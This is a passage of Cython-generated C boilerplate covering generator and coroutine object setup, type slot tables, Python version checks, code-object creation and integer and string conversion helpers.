Py_DECREF(frame);\n            frame = self->gi_frame;\n        } else {\n            self->gi_frame = frame;\n        }\n    }\n    Py_INCREF(frame);\n    #if PY_VERSION_HEX >= 0x030d0000\n    Py_END_CRITICAL_SECTION();\n    #endif\n    return frame;\n#else\n    CYTHON_UNUSED_VAR(self);\n    Py_RETURN_NONE;\n#endif\n}\nstatic PyObject *\n__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    PyObject *frame = self->gi_frame;\n    if (frame)\n        return __Pyx_NewRef(frame);\n    return __Pyx__Coroutine_get_frame(self);\n}\nstatic __pyx_CoroutineObject *__Pyx__Coroutine_New(\n            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,\n            PyObject *name, PyObject *qualname, PyObject *module_name) {\n    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);\n    if (unlikely(!gen))\n        return NULL;\n    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);\n}\nstatic __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(\n            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,\n            PyObject *name, PyObject *qualname, PyObject *module_name) {\n    gen->body = body;\n    gen->closure = closure;\n    Py_XINCREF(closure);\n    gen->is_running = 0;\n    gen->resume_label = 0;\n    gen->classobj = NULL;\n    gen->yieldfrom = NULL;\n    gen->yieldfrom_am_send = NULL;\n    #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_LIMITED_API\n    gen->gi_exc_state.exc_value = NULL;\n    #else\n    gen->gi_exc_state.exc_type = NULL;\n    gen->gi_exc_state.exc_value = NULL;\n    gen->gi_exc_state.exc_traceback = NULL;\n    #endif\n#if CYTHON_USE_EXC_INFO_STACK\n    gen->gi_exc_state.previous_item = NULL;\n#endif\n    gen->gi_weakreflist = NULL;\n    Py_XINCREF(qualname);\n    gen->gi_qualname = qualname;\n    Py_XINCREF(name);\n    gen->gi_name = name;\n    Py_XINCREF(module_name);\n    gen->gi_modulename = module_name;\n    Py_XINCREF(code);\n    gen->gi_code = code;\n    gen->gi_frame = NULL;\n    PyObject_GC_Track(gen);\n    return gen;\n}\nstatic char __Pyx_Coroutine_test_and_set_is_running(__pyx_CoroutineObject *gen) {\n    char result;\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_BEGIN_CRITICAL_SECTION(gen);\n    #endif\n    result = gen->is_running;\n    gen->is_running = 1;\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_END_CRITICAL_SECTION();\n    #endif\n    return result;\n}\nstatic void __Pyx_Coroutine_unset_is_running(__pyx_CoroutineObject *gen) {\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_BEGIN_CRITICAL_SECTION(gen);\n    #endif\n    assert(gen->is_running);\n    gen->is_running = 0;\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_END_CRITICAL_SECTION();\n    #endif\n}\nstatic char __Pyx_Coroutine_get_is_running(__pyx_CoroutineObject *gen) {\n    char result;\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_BEGIN_CRITICAL_SECTION(gen);\n    #endif\n    result = gen->is_running;\n    #if PY_VERSION_HEX >= 0x030d0000 && !CYTHON_COMPILING_IN_LIMITED_API\n    Py_END_CRITICAL_SECTION();\n    #endif\n    return result;\n}\nstatic PyObject *__Pyx_Coroutine_get_is_running_getter(PyObject *gen, void *closure) {\n    CYTHON_UNUSED_VAR(closure);\n    char result = __Pyx_Coroutine_get_is_running((__pyx_CoroutineObject*)gen);\n    if (result) Py_RETURN_TRUE;\n    else Py_RETURN_FALSE;\n}\n#if __PYX_HAS_PY_AM_SEND == 2\nstatic void __Pyx_SetBackportTypeAmSend(PyTypeObject *type, __Pyx_PyAsyncMethodsStruct *static_amsend_methods, __Pyx_pyiter_sendfunc am_send) {\n    Py_ssize_t ptr_offset = (char*)(type->tp_as_async) - (char*)type;\n    if (ptr_offset < 0 || ptr_offset > type->tp_basicsize) {\n        return;\n    }\n    memcpy((void*)static_amsend_methods, (void*)(type->tp_as_async), sizeof(*type->tp_as_async));\n    static_amsend_methods->am_send = am_send;\n    type->tp_as_async = __Pyx_SlotTpAsAsync(static_amsend_methods);\n}\n#endif\nstatic PyObject *__Pyx_Coroutine_fail_reduce_ex(PyObject *self, PyObject *arg) {\n    CYTHON_UNUSED_VAR(arg);\n    __Pyx_TypeName self_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE((PyObject*)self));\n    PyErr_Format(PyExc_TypeError, "cannot pickle \'" __Pyx_FMT_TYPENAME "\' object",\n                         self_type_name);\n    __Pyx_DECREF_TypeName(self_type_name);\n    return NULL;\n}\n\n\nstatic PyMethodDef __pyx_Generator_methods[] = {\n    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,\n     PyDoc_STR("send(arg) -> send \'arg\' into generator,\\nreturn next yielded value or raise StopIteration.")},\n    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,\n     PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\\nreturn next yielded value or raise StopIteration.")},\n    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,\n     PyDoc_STR("close() -> raise GeneratorExit inside generator.")},\n    {"__reduce_ex__", (PyCFunction) __Pyx_Coroutine_fail_reduce_ex, METH_O, 0},\n    {"__reduce__", (PyCFunction) __Pyx_Coroutine_fail_reduce_ex, METH_NOARGS, 0},\n    {0, 0, 0, 0}\n};\nstatic PyMemberDef __pyx_Generator_memberlist[] = {\n    {"gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,\n     PyDoc_STR("object being iterated by \'yield from\', or None")},\n    {"gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},\n    {"__module__", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_modulename), 0, 0},\n    {"__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CoroutineObject, gi_weakreflist), READONLY, 0},\n    {0, 0, 0, 0, 0}\n};\nstatic PyGetSetDef __pyx_Generator_getsets[] = {\n    {"__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,\n     PyDoc_STR("name of the generator"), 0},\n    {"__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,\n     PyDoc_STR("qualified name of the generator"), 0},\n    {"gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,\n     PyDoc_STR("Frame of the generator"), 0},\n    {"gi_running", __Pyx_Coroutine_get_is_running_getter, NULL, NULL, NULL},\n    {0, 0, 0, 0, 0}\n};\nstatic PyType_Slot __pyx_GeneratorType_slots[] = {\n    {Py_tp_dealloc, (void *)__Pyx_Coroutine_dealloc},\n    {Py_tp_traverse, (void *)__Pyx_Coroutine_traverse},\n    {Py_tp_iter, (void *)PyObject_SelfIter},\n    {Py_tp_iternext, (void *)__Pyx_Generator_Next},\n    {Py_tp_methods, (void *)__pyx_Generator_methods},\n    {Py_tp_members, (void *)__pyx_Generator_memberlist},\n    {Py_tp_getset, (void *)__pyx_Generator_getsets},\n    {Py_tp_getattro, (void *) PyObject_GenericGetAttr},\n#if CYTHON_USE_TP_FINALIZE\n    {Py_tp_finalize, (void *)__Pyx_Coroutine_del},\n#endif\n#if __PYX_HAS_PY_AM_SEND == 1\n    {Py_am_send, (void *)__Pyx_Coroutine_AmSend},\n#endif\n    {0, 0},\n};\nstatic PyType_Spec __pyx_GeneratorType_spec = {\n    __PYX_TYPE_MODULE_PREFIX "generator",\n    sizeof(__pyx_CoroutineObject),\n    0,\n#if PY_VERSION_HEX >= 0x030A0000\n    Py_TPFLAGS_IMMUTABLETYPE |\n#endif\n    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE | __Pyx_TPFLAGS_HAVE_AM_SEND,\n    __pyx_GeneratorType_slots\n};\n#if __PYX_HAS_PY_AM_SEND == 2\nstatic __Pyx_PyAsyncMethodsStruct __pyx_Generator_as_async;\n#endif\nstatic int __pyx_Generator_init(PyObject *module) {\n    __pyx_mstatetype *mstate = __Pyx_PyModule_GetState(module);\n    mstate->__pyx_GeneratorType = __Pyx_FetchCommonTypeFromSpec(\n        mstate->__pyx_CommonTypesMetaclassType, module, &__pyx_GeneratorType_spec, NULL);\n    if (unlikely(!mstate->__pyx_GeneratorType)) {\n        return -1;\n    }\n#if __PYX_HAS_PY_AM_SEND == 2\n    __Pyx_SetBackportTypeAmSend(mstate->__pyx_GeneratorType, &__pyx_Generator_as_async, &__Pyx_Coroutine_AmSend);\n#endif\n    return 0;\n}\nstatic PyObject *__Pyx_Generator_GetInlinedResult(PyObject *self) {\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;\n    PyObject *retval = NULL;\n    if (unlikely(__Pyx_Coroutine_test_and_set_is_running(gen))) {\n        return __Pyx_Coroutine_AlreadyRunningError(gen);\n    }\n    __Pyx_PySendResult result = __Pyx_Coroutine_SendEx(gen, Py_None, &retval, 0);\n    __Pyx_Coroutine_unset_is_running(gen);\n    (void) result;\n    assert (result == PYGEN_RETURN || result == PYGEN_ERROR);\n    assert ((result == PYGEN_RETURN && retval != NULL) || (result == PYGEN_ERROR && retval == NULL));\n    return retval;\n}\n\n\nstatic unsigned long __Pyx_get_runtime_version(void) {\n#if __PYX_LIMITED_VERSION_HEX >= 0x030b0000\n    return Py_Version & ~0xFFUL;\n#else\n    static unsigned long __Pyx_cached_runtime_version = 0;\n    if (__Pyx_cached_runtime_version == 0) {\n        const char* rt_version = Py_GetVersion();\n        unsigned long version = 0;\n        unsigned long factor = 0x01000000UL;\n        unsigned int digit = 0;\n        int i = 0;\n        while (factor) {\n            while (\'0\' <= rt_version[i] && rt_version[i] <= \'9\') {\n                digit = digit * 10 + (unsigned int) (rt_version[i] - \'0\');\n                ++i;\n            }\n            version += factor * digit;\n            if (rt_version[i] != \'.\')\n                break;\n            digit = 0;\n            factor >>= 8;\n            ++i;\n        }\n        __Pyx_cached_runtime_version = version;\n    }\n    return __Pyx_cached_runtime_version;\n#endif\n}\n\n\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer) {\n    const unsigned long MAJOR_MINOR = 0xFFFF0000UL;\n    if ((rt_version & MAJOR_MINOR) == (ct_version & MAJOR_MINOR))\n        return 0;\n    if (likely(allow_newer && (rt_version & MAJOR_MINOR) > (ct_version & MAJOR_MINOR)))\n        return 1;\n    {\n        char message[200];\n        PyOS_snprintf(message, sizeof(message),\n                      "compile time Python version %d.%d "\n                      "of module \'%.100s\' "\n                      "%s "\n                      "runtime version %d.%d",\n                       (int) (ct_version >> 24), (int) ((ct_version >> 16) & 0xFF),\n                       __Pyx_MODULE_NAME,\n                       (allow_newer) ? "was newer than" : "does not match",\n                       (int) (rt_version >> 24), (int) ((rt_version >> 16) & 0xFF)\n       );\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n}\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\n    static PyObject* __Pyx__PyCode_New(int a, int p, int k, int l, int s, int f,\n                                       PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                       PyObject *fv, PyObject *cell, PyObject* fn,\n                                       PyObject *name, int fline, PyObject *lnos) {\n        PyObject *exception_table = NULL;\n        PyObject *types_module=NULL, *code_type=NULL, *result=NULL;\n        #if __PYX_LIMITED_VERSION_HEX < 0x030b0000\n        PyObject *version_info;\n        PyObject *py_minor_version = NULL;\n        #endif\n        long minor_version = 0;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceback);\n        #if __PYX_LIMITED_VERSION_HEX >= 0x030b0000\n        minor_version = 11;\n        #else\n        if (!(version_info = PySys_GetObject("version_info"))) goto end;\n        if (!(py_minor_version = PySequence_GetItem(version_info, 1))) goto end;\n        minor_version = PyLong_AsLong(py_minor_version);\n        Py_DECREF(py_minor_version);\n        if (minor_version == -1 && PyErr_Occurred()) goto end;\n        #endif\n        if (!(types_module = PyImport_ImportModule("types"))) goto end;\n        if (!(code_type = PyObject_GetAttrString(types_module, "CodeType"))) goto end;\n        if (minor_version <= 7) {\n            (void)p;\n            result = PyObject_CallFunction(code_type, "iiiiiOOOOOOiOOO", a, k, l, s, f, code,\n                          c, n, v, fn, name, fline, lnos, fv, cell);\n        } else if (minor_version <= 10) {\n            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOiOOO", a,p, k, l, s, f, code,\n                          c, n, v, fn, name, fline, lnos, fv, cell);\n        } else {\n            if (!(exception_table = PyBytes_FromStringAndSize(NULL, 0))) goto end;\n            result = PyObject_CallFunction(code_type, "iiiiiiOOOOOOOiOOOO", a,p, k, l, s, f, code,\n                          c, n, v, fn, name, name, fline, lnos, exception_table, fv, cell);\n        }\n    end:\n        Py_XDECREF(code_type);\n        Py_XDECREF(exception_table);\n        Py_XDECREF(types_module);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return result;\n    }\n#elif PY_VERSION_HEX >= 0x030B0000\n  static PyCodeObject* __Pyx__PyCode_New(int a, int p, int k, int l, int s, int f,\n                                         PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                         PyObject *fv, PyObject *cell, PyObject* fn,\n                                         PyObject *name, int fline, PyObject *lnos) {\n    PyCodeObject *result;\n    result =\n      #if PY_VERSION_HEX >= 0x030C0000\n        PyUnstable_Code_NewWithPosOnlyArgs\n      #else\n        PyCode_NewWithPosOnlyArgs\n      #endif\n        (a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, name, fline, lnos, __pyx_mstate_global->__pyx_empty_bytes);\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030c00A1\n    if (likely(result))\n        result->_co_firsttraceable = 0;\n    #endif\n    return result;\n  }\n#elif PY_VERSION_HEX >= 0x030800B2 && !CYTHON_COMPILING_IN_PYPY\n  #define __Pyx__PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_NewWithPosOnlyArgs(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#else\n  #define __Pyx__PyCode_New(a, p, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\nstatic PyObject* __Pyx_PyCode_New(\n        const __Pyx_PyCode_New_function_description descr,\n        PyObject * const *varnames,\n        PyObject *filename,\n        PyObject *funcname,\n        const char *line_table,\n        PyObject *tuple_dedup_map\n) {\n    PyObject *code_obj = NULL, *varnames_tuple_dedup = NULL, *code_bytes = NULL, *line_table_bytes = NULL;\n    Py_ssize_t var_count = (Py_ssize_t) descr.nlocals;\n    PyObject *varnames_tuple = PyTuple_New(var_count);\n    if (unlikely(!varnames_tuple)) return NULL;\n    for (Py_ssize_t i=0; i < var_count; i++) {\n        Py_INCREF(varnames[i]);\n        if (__Pyx_PyTuple_SET_ITEM(varnames_tuple, i, varnames[i]) != (0)) goto done;\n    }\n    #if CYTHON_COMPILING_IN_LIMITED_API\n    varnames_tuple_dedup = PyDict_GetItem(tuple_dedup_map, varnames_tuple);\n    if (!varnames_tuple_dedup) {\n        if (unlikely(PyDict_SetItem(tuple_dedup_map, varnames_tuple, varnames_tuple) < 0)) goto done;\n        varnames_tuple_dedup = varnames_tuple;\n    }\n    #else\n    varnames_tuple_dedup = PyDict_SetDefault(tuple_dedup_map, varnames_tuple, varnames_tuple);\n    if (unlikely(!varnames_tuple_dedup)) goto done;\n    #endif\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_INCREF(varnames_tuple_dedup);\n    #endif\n    if (__PYX_LIMITED_VERSION_HEX >= (0x030b0000) && line_table != NULL\n        && !CYTHON_COMPILING_IN_GRAAL) {\n        line_table_bytes = PyBytes_FromStringAndSize(line_table, descr.line_table_length);\n        if (unlikely(!line_table_bytes)) goto done;\n        Py_ssize_t code_len = (descr.line_table_length * 2 + 4) & ~3;\n        code_bytes = PyBytes_FromStringAndSize(NULL, code_len);\n        if (unlikely(!code_bytes)) goto done;\n        char* c_code_bytes = PyBytes_AsString(code_bytes);\n        if (unlikely(!c_code_bytes)) goto done;\n        memset(c_code_bytes, 0, (size_t) code_len);\n    }\n    code_obj = (PyObject*) __Pyx__PyCode_New(\n        (int) descr.argcount,\n        (int) descr.num_posonly_args,\n        (int) descr.num_kwonly_args,\n        (int) descr.nlocals,\n        0,\n        (int) descr.flags,\n        code_bytes ? code_bytes : __pyx_mstate_global->__pyx_empty_bytes,\n        __pyx_mstate_global->__pyx_empty_tuple,\n        __pyx_mstate_global->__pyx_empty_tuple,\n        varnames_tuple_dedup,\n        __pyx_mstate_global->__pyx_empty_tuple,\n        __pyx_mstate_global->__pyx_empty_tuple,\n        filename,\n        funcname,\n        (int) descr.first_line,\n        (__PYX_LIMITED_VERSION_HEX >= (0x030b0000) && line_table_bytes) ? line_table_bytes : __pyx_mstate_global->__pyx_empty_bytes\n    );\ndone:\n    Py_XDECREF(code_bytes);\n    Py_XDECREF(line_table_bytes);\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_XDECREF(varnames_tuple_dedup);\n    #endif\n    Py_DECREF(varnames_tuple);\n    return code_obj;\n}\n\n\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry const *t, PyObject **target, const char* const* encoding_names) {\n    while (t->s) {\n        PyObject *str;\n        if (t->is_unicode) {\n            if (t->intern) {\n                str = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                str = PyUnicode_Decode(t->s, t->n - 1, encoding_names[t->encoding], NULL);\n            } else {\n                str = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            str = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        if (!str)\n            return -1;\n        *target = str;\n        if (PyObject_Hash(str) == -1)\n            return -1;\n        ++t;\n        ++target;\n    }\n    return 0;\n}\n\n#include <string.h>\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s) {\n    size_t len = strlen(s);\n    if (unlikely(len > (size_t) PY_SSIZE_T_MAX)) {\n        PyErr_SetString(PyExc_OverflowError, "byte string is too long");\n        return -1;\n    }\n    return (Py_ssize_t) len;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return PyByteArray_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    {\n        const char* result;\n        Py_ssize_t unicode_length;\n        CYTHON_MAYBE_UNUSED_VAR(unicode_length); // only for __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n        #if __PYX_LIMITED_VERSION_HEX < 0x030A0000\n        if (unlikely(PyArg_Parse(o, "s#", &result, length) < 0)) return NULL;\n        #else\n        result = PyUnicode_AsUTF8AndSize(o, length);\n        #endif\n        #if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n        unicode_length = PyUnicode_GetLength(o);\n        if (unlikely(unicode_length < 0)) return NULL;\n        if (unlikely(unicode_length != *length)) {\n            PyUnicode_AsASCIIString(o);\n            return NULL;\n        }\n        #endif\n        return result;\n    }\n#else\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n#endif\n}\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\n    if (PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n    if (PyByteArray_Check(o)) {\n#if (CYTHON_ASSUME_SAFE_SIZE && CYTHON_ASSUME_SAFE_MACROS) || (CYTHON_COMPILING_IN_PYPY && (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE)))\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n#else\n        *length = PyByteArray_Size(o);\n        if (*length == -1) return NULL;\n        return PyByteArray_AsString(o);\n#endif\n    } else\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_LongWrongResultType(PyObject* result) {\n    __Pyx_TypeName result_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(result));\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "\n                "The ability to return an instance of a strict subclass of int is deprecated, "\n                "and may be removed in a future version of Python.",\n                result_type_name)) {\n            __Pyx_DECREF_TypeName(result_type_name);\n            Py_DECREF(result);\n            return NULL;\n        }\n        __Pyx_DECREF_TypeName(result_type_name);\n        return result;\n    }\n    PyErr_Format(PyExc_TypeError,\n                 "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ")",\n                 result_type_name);\n    __Pyx_DECREF_TypeName(result_type_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  PyObject *res = NULL;\n  if (likely(PyLong_Check(x)))\n      return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  if (likely(m && m->nb_int)) {\n      res = m->nb_int(x);\n  }\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n      res = PyNumber_Long(x);\n  }\n#endif\n  if (likely(res)) {\n      if (unlikely(!PyLong_CheckExact(res))) {\n          return __Pyx_PyNumber_LongWrongResultType(res);\n      }\n  }\n  else if (!PyErr_Occurred()) {\n      PyErr_SetString(PyExc_TypeError,\n                      "an integer is required");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(__Pyx_PyLong_IsCompact(b))) {\n        return __Pyx_PyLong_CompactValue(b);\n    } else {\n      const digit* digits = __Pyx_PyLong_Digits(b);\n      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyLong_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyLong_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b) {\n    CYTHON_UNUSED_VAR(b);\n    return __Pyx_NewRef(Py_None);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t ival) {\n    return PyLong_FromSize_t(ival);\n}\n#if CYTHON_USE_PYLONG_INTERNALS\nstatic CYTHON_INLINE int __Pyx_PyLong_CompactAsLong(PyObject *x, long *return_value) {\n    if (unlikely(!__Pyx_PyLong_IsCompact(x)))\n        return 0;\n    Py_ssize_t value = __Pyx_PyLong_CompactValue(x);\n    if ((sizeof(long) < sizeof(Py_ssize_t)) && unlikely(value != (long) value))\n        return 0;\n    *return_value = (long) value;\n    return 1;\n}\n#endif\n\n\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE\n#ifndef CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n#if (CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX >= 0x030C0000)\n  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 1\n#else\n  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 0\n#endif\n#endif\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE && !CYTHON_ATOMICS\n#error "Module state with PEP489 requires atomics. Currently that\'s one of\\\n C11, C++11, gcc atomic intrinsics or MSVC atomic intrinsics"\n#endif\n#if !CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n#define __Pyx_ModuleStateLookup_Lock()\n#define __Pyx_ModuleStateLookup_Unlock()\n#elif !CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x030d0000\nstatic PyMutex __Pyx_ModuleStateLookup_mutex = {0};\n#define __Pyx_ModuleStateLookup_Lock() PyMutex_Lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() PyMutex_Unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(__cplusplus) && __cplusplus >= 201103L\n#include <mutex>\nstatic std::mutex __Pyx_ModuleStateLookup_mutex;\n#define __Pyx_ModuleStateLookup_Lock() __Pyx_ModuleStateLookup_mutex.lock()\n#define __Pyx_ModuleStateLookup_Unlock() __Pyx_ModuleStateLookup_mutex.unlock()\n#elif defined(__STDC_VERSION__) && (__STDC_VERSION__ > 201112L) && !defined(__STDC_NO_THREADS__)\n#include <threads.h>\nstatic mtx_t __Pyx_ModuleStateLookup_mutex;\nstatic once_flag __Pyx_ModuleStateLookup_mutex_once_flag = ONCE_FLAG_INIT;\nstatic void __Pyx_ModuleStateLookup_initialize_mutex(void) {\n    mtx_init(&__Pyx_ModuleStateLookup_mutex, mtx_plain);\n}\n#define __Pyx_ModuleStateLookup_Lock()\\\n  